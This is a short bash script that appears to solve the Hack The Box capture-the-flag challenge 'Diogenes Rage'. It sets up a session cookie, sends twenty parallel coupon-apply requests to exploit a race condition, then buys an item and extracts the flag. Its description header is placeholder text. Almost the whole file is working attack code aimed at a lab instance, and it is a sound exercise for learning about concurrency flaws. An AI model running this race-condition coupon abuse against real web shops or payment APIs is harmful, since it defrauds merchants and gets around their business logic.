#!/bin/bash

####################################################################
# Author      : AnyGuy
# Date        : 2023-05-29
#
# Title       : exploit-htb-diogenes-rage.sh
#
# Description : Here comes text
#    
#    - xy
#    - xy
#    - xy


####################################################################
# Script Start
#
set -euo pipefail

TARGET=68.183.47.129:31920

# clean up from before if here
function cleanup {
  rm jar 2>&1 > /dev/null || true
}

trap cleanup EXIT

# generate a user on the server and store cookie locally
curl -s -c jar -b jar "http://${TARGET}/api/purchase" -d 'item=C8' 2>&1 > /dev/null

# exploit race condition
for i in {1..20}; do
  curl -s -c jar -b jar "http://${TARGET}/api/coupons/apply" -d 'coupon_code=HTB_100' 2>&1 > /dev/null &
done

# wait for curl to finish (hopefully)
echo "sleeping for a hot second (or two)..."
sleep 2

curl -s -c jar -b jar "http://${TARGET}/api/purchase" -d 'item=C8' | grep -oE '"HTB{.*}"' || echo "exploit failed, try again"

# or if you have jq installed
# curl -s -c jar -b jar http://139.59.180.127:32556/api/purchase -d 'item=C8' | jq -r '.flag'
